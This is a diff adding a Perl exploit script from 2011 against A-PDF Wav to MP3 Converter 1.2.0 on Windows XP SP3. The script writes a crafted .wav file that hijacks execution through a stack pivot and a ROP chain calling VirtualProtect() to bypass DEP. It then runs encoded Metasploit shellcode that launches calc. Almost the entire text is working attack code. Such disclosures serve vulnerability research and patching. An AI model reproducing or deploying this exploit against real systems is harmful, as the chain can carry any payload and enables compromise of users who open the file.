@@ -1,0 +1,101 @@
+# Exploit Title: A-PDF Wav to MP3 Converter v 1.2.0 DEP Bypass
+# Software Link: http://www.a-pdf.com/wav-to-mp3/a-pdf-wtm.exe
+# Version: 1.2.0
+# Tested on: Win XP SP3 French
+# Date: 12/05/2011
+# Author: h1ch4m (Hicham Oumounid)
+# Email: h1ch4m@live.fr
+# Home: http://net-effects.blogspot.com
+# Big thanks to corelanc0d3r for the Help & the Precious advices
+
+my $file= "Exploit.wav";
+#######################      STACK PIVOT      ###########################
+my $EIP = pack('V', 0x100040CF);        # RETN - wavtomp3.exe -  ** Null byte **
+
+# not enough space for the ROP and Shellcode, so: sub esp,1030 & we land in the beginning of our payload(ROP)
+my $SP = pack('V', 0x004A394A);         # POP ECX # RETN 	[Module : wavtomp3.exe]  ** Null byte ** - [ Ascii printable - null byte]
+$SP .= pack('V', 0x00001030);           # 1030h
+$SP .= pack('V', 0x00478D2C);           # PUSH ESP # MOV EAX,EDI # POP EDX # POP EBP # POP EDI # POP ESI # POP EBX # RETN 	[Module : wavtomp3.exe]  ** Null byte **
+$SP .= "A" x 16; 
+$SP .= pack('V', 0x00401D3C);           # MOV EAX,EDX # RETN 	[Module : wavtomp3.exe]  ** Null byte **
+$SP .= pack('V', 0x004130DE);           # SUB EAX,ECX # RETN 	[Module : wavtomp3.exe]  ** Null byte **
+$SP .= pack('V', 0x0041097B);           # XCHG EAX,ESP # RETN 	[Module : wavtomp3.exe]  ** Null byte **
+
+#######################     STACK POINTER     ###########################
+my $ROP = pack('V', 0x00478D2C);        # PUSH ESP # MOV EAX,EDI # POP EDX # POP EBP # POP EDI # POP ESI # POP EBX # RETN 	[Module : wavtomp3.exe]  ** Null byte **
+$ROP .= "A" x 16; 
+$ROP .= pack('V', 0x00401D3C);          # MOV EAX,EDX # RETN 	[Module : wavtomp3.exe]  ** Null byte **
+$ROP .= pack('V', 0x10004642);          # ADD ESP,18 # RETN 	[Module : lame_enc.dll]  ** Null byte **
+
+############ VirtualProtect() Parameters  ############
+$ROP .= pack('V', 0x7c801ad4);          # VirtualProtect()  0x7c801ad4 Kernel32.dll
+$ROP .= "AAAA";                         # Parameter 1
+$ROP .= "BBBB";                         # Parameter 2
+$ROP .= "CCCC";                         # Parameter 3
+$ROP .= "DDDD";                         # Parameter 4
+$ROP .= pack("V", 0x10054000);          # Writeable address
+
+######################   PARAMETER 1  ###########################
+$ROP .= pack('V', 0x0040808F);          # ADD EAX,10 # RETN 	[Module : wavtomp3.exe]  ** Null byte **
+$ROP .= pack('V', 0x1002B936);          # ADD EAX,0C # RETN 	[Module : lame_enc.dll]  ** 
+$ROP .= pack('V', 0x0040F944);          # MOV ECX,EAX # MOV EAX,ECX # RETN 	[Module : wavtomp3.exe]  ** Null byte **
+$ROP .= pack('V', 0x00401D3C);          # MOV EAX,EDX # RETN 	[Module : wavtomp3.exe]  ** Null byte **
+$ROP .= pack('V', 0x1003C6A4);          # ADD EAX,100 # POP EBP # RETN 	[Module : lame_enc.dll]  **
+$ROP .= "A" x 4;  
+$ROP .= pack('V', 0x1002B23D);          # ADD EAX,20 # RETN 	[Module : lame_enc.dll]  ** 
+$ROP .= pack('V', 0x1002B910);          # ADD EAX,8 # RETN 	[Module : lame_enc.dll]  ** 
+$ROP .= pack('V', 0x00402ABC);          # MOV DWORD PTR DS:[ECX],EAX # RETN 	[Module : wavtomp3.exe]  ** Null byte **
+
+######################   PARAMETER 2  ###########################
+$ROP .= pack('V', 0x10002388);          # MOV DWORD PTR DS:[ECX+4],EAX # XOR EAX,EAX # RETN 	[Module : lame_enc.dll]  ** Null byte **
+
+######################   PARAMETER 3  ###########################
+$ROP .= pack('V', 0x1003C6A4);          # ADD EAX,100 # POP EBP # RETN 	[Module : lame_enc.dll]  **
+$ROP .= "A" x 4;  
+$ROP .= pack('V', 0x1003C6A4);          # ADD EAX,100 # POP EBP # RETN 	[Module : lame_enc.dll]  **
+$ROP .= "A" x 4;  
+$ROP .= pack('V', 0x1003C6A4);          # ADD EAX,100 # POP EBP # RETN 	[Module : lame_enc.dll]  **
+$ROP .= "A" x 4;  
+$ROP .= pack('V', 0x100023D1);          # MOV DWORD PTR DS:[ECX+8],EAX # XOR EAX,EAX # RETN 	[Module : lame_enc.dll]  ** Null byte **
+
+######################   PARAMETER 4  ###########################
+$ROP .= pack('V', 0x1002B23D) x 2;      # ADD EAX,20 # RETN 	[Module : lame_enc.dll]  **
+$ROP .= pack('V', 0x100023A8);          # MOV DWORD PTR DS:[ECX+C],EAX # XOR EAX,EAX # RETN 	[Module : lame_enc.dll]  ** Null byte **
+
+################### Jump To VirtualProtect() #####################
+$ROP .= pack('V', 0x004027D9);          # MOV EAX,ECX # RETN 	[Module : wavtomp3.exe]  ** Null byte **
+$ROP .= pack('V', 0x0040BFC1);          # SUB EAX,4 # RETN 	[Module : wavtomp3.exe]  ** Null byte **
+$ROP .= pack('V', 0x0041097B);          # XCHG EAX,ESP # RETN 	[Module : wavtomp3.exe]  ** Null byte **
+
+#######################    NOPS     ###########################
+my $NOPS = "\x90" x (300 - length($ROP));
+
+#######################  SHELLCODE  ###########################
+# windows/exec - 223 bytes
+# http://www.metasploit.com
+# Encoder: x86/shikata_ga_nai
+# EXITFUNC=seh, CMD=calc
+my $shellcode = "\xda\xdd\xbf\xb0\x1a\x64\x4f\xd9\x74\x24\xf4\x58\x31\xc9" .
+"\xb1\x32\x31\x78\x17\x83\xc0\x04\x03\xc8\x09\x86\xba\xd4" .
+"\xc6\xcf\x45\x24\x17\xb0\xcc\xc1\x26\xe2\xab\x82\x1b\x32" .
+"\xbf\xc6\x97\xb9\xed\xf2\x2c\xcf\x39\xf5\x85\x7a\x1c\x38" .
+"\x15\x4b\xa0\x96\xd5\xcd\x5c\xe4\x09\x2e\x5c\x27\x5c\x2f" .
+"\x99\x55\xaf\x7d\x72\x12\x02\x92\xf7\x66\x9f\x93\xd7\xed" .
+"\x9f\xeb\x52\x31\x6b\x46\x5c\x61\xc4\xdd\x16\x99\x6e\xb9" .
+"\x86\x98\xa3\xd9\xfb\xd3\xc8\x2a\x8f\xe2\x18\x63\x70\xd5" .
+"\x64\x28\x4f\xda\x68\x30\x97\xdc\x92\x47\xe3\x1f\x2e\x50" .
+"\x30\x62\xf4\xd5\xa5\xc4\x7f\x4d\x0e\xf5\xac\x08\xc5\xf9" .
+"\x19\x5e\x81\x1d\x9f\xb3\xb9\x19\x14\x32\x6e\xa8\x6e\x11" .
+"\xaa\xf1\x35\x38\xeb\x5f\x9b\x45\xeb\x07\x44\xe0\x67\xa5" .
+"\x91\x92\x25\xa3\x64\x16\x50\x8a\x67\x28\x5b\xbc\x0f\x19" .
+"\xd0\x53\x57\xa6\x33\x10\xa9\x57\x8e\x8c\x3e\xce\x7b\xed" .
+"\x22\xf1\x51\x31\x5b\x72\x50\xc9\x98\x6a\x11\xcc\xe5\x2c" .
+"\xc9\xbc\x76\xd9\xed\x13\x76\xc8\x8d\xf2\xe4\x90\x51";
+
+my $junk = "\x41" x (4128 - length($ROP.$NOPS.$shellcode));
+
+open($FILE,">$file");
+print $FILE $ROP.$NOPS.$shellcode.$junk.$EIP.$SP;
+close($FILE);
+print "File Created successfully\n";
+sleep(1);
